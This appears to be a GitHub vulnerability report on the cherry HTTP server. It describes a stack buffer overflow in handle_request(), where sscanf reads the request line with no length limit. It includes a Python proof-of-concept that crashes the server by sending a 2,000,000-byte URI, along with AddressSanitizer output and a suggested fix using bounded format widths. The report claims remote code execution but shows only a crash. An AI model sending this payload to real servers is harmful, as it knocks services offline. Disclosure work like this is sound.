| Hi!  I discovered a remote stack buffer overflow vulnerability in the function handle\_request() at http.c, line 54:     [cherry/src/http.c](https://github.com/hayyp/cherry/blob/4b877df82f9bccd2384c58ee9145deaab94de4ba/src/http.c#L54)  Line 54 in [4b877df](/hayyp/cherry/commit/4b877df82f9bccd2384c58ee9145deaab94de4ba)   |  | sscanf(buf, "%s %s %s", method, uri, version); // for example, GET / HTTP/1.1 | | --- | --- |      Any project that utilizes cherry is vulnerable to remote code execution. I have outlined the reproduction steps below, and offer some mitigations that can be implemented to protect yourself. Makefile Modifications The following modifications were made to the Makefile to compile cherry with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the stack buffer overflow vulnerability:  ``` CC=gcc CFLAGS= -Wall -Wextra -DLOG_USE_COLOR -fsanitize=address -g  .PHONY: clean  cherry: server.c log.c rio.c http.c epoll.c task.c utils.c 	$(CC) $^ -o $@ $(CFLAGS)  clean: 	rm cherry a.out 	  ``` Compiling Cherry ``` $ make  ``` Proof of Concept Python3 Script Save the following script to a file named poc.py. The script will send an HTTP request with a malformed URI (2,000,000 bytes long) to cherry and wait for a response:  ``` #!/usr/bin/env python3  import socket  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(("localhost", 3333)) sock.send(b"GET /"+b"C"*2000000+b"HTTP/1.1\r\nHost:localhost:3333\r\n\r\n") response = sock.recv(4096) sock.close()   ``` Starting Cherry ``` ./cherry  ``` Executing our Python3 Script ``` # python3 poc.py  ``` Address Sanitizer Output The following output was produced by address sanitizer:  ``` ==3024==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fcf196002f0 at pc 0x7fcf1b087791 bp 0x7ffc4e0bf090 sp 0x7ffc4e0be850 WRITE of size 8188 at 0x7fcf196002f0 thread T0     #0 0x7fcf1b087790 in scanf_common ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:342     #1 0x7fcf1b0883fe in __interceptor___isoc99_vsscanf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1612     #2 0x7fcf1b0884ee in __interceptor___isoc99_sscanf ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1635     #3 0x55a0ffa0561d in handle_request /home/kali/projects/fuzzing/cherry/src/http.c:54     #4 0x55a0ffa072c7 in request_handler /home/kali/projects/fuzzing/cherry/src/utils.c:57     #5 0x55a0ffa03908 in main /home/kali/projects/fuzzing/cherry/src/server.c:69     #6 0x7fcf1ae456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58     #7 0x7fcf1ae45784 in __libc_start_main_impl ../csu/libc-start.c:360     #8 0x55a0ffa03450 in _start (/home/kali/projects/fuzzing/cherry/src/cherry+0x4450) (BuildId: f07795ccbe440d35fcd7b1ea59114aa3d9bc6d55)  Address 0x7fcf196002f0 is located in stack of thread T0 at offset 752 in frame     #0 0x55a0ffa05370 in handle_request /home/kali/projects/fuzzing/cherry/src/http.c:35    This frame has 7 object(s):     [32, 176) 'sbuf' (line 41)     [240, 752) 'uri' (line 37)     [816, 1328) 'version' (line 37) <== Memory access at offset 752 partially underflows this variable     [1392, 1904) 'filename' (line 40) <== Memory access at offset 752 partially underflows this variable     [1968, 10160) 'method' (line 37) <== Memory access at offset 752 partially underflows this variable     [10416, 18608) 'buf' (line 38)     [18864, 27072) 'rio' (line 36) HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork       (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors_format.inc:342 in scanf_common Shadow bytes around the buggy address:   0x7fcf19600000: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00   0x7fcf19600080: 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 00 00   0x7fcf19600100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fcf19600180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fcf19600200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x7fcf19600280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00[f2]f2   0x7fcf19600300: f2 f2 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00   0x7fcf19600380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fcf19600400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fcf19600480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x7fcf19600500: 00 00 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 00 00 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==3024==ABORTING    ```  From the output we can verify that a WRITE of size 8188 at occurred in thread T0. Mitigation The issue with the code is that it doesn't limit the number of characters read into each string. This can cause a buffer overflow if the input strings are longer than the buffers allocated for method, uri, and version. To fix this, you need to specify maximum field widths in the sscanf format string. These widths should be at least one less than the size of the buffers (to leave space for the null terminator):  Buffer overflow vulnerability:  ``` sscanf(buf, "%s %s %s", method, uri, version); // for example, GET / HTTP/1.1   ```  Modified code preventing a buffer overflow:  ``` sscanf(buf, "%5000s %300s %300s", method, uri, version); // for example, GET / HTTP/1.1   ``` References  * <https://cwe.mitre.org/data/definitions/121.html> * <https://owasp.org/www-community/vulnerabilities/Buffer_Overflow> * <https://github.com/google/sanitizers/wiki/AddressSanitizer> |
